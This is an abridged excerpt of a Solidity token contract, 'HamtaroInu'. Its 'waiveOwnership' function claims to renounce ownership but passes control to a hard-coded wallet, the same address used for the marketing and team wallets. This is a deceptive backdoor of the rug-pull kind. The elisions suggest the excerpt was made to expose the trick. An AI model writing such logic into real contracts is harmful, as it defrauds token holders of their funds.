...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x90F5f2aBF0F9A164c0517c861687e8edEFCF52ae);
    }
...
contract HamtaroInu is Context, IERC20, Ownable {
    ...
    address payable private marketingWalletAddress = payable(0x90F5f2aBF0F9A164c0517c861687e8edEFCF52ae);
    address payable private teamWalletAddress = payable(0x90F5f2aBF0F9A164c0517c861687e8edEFCF52ae);
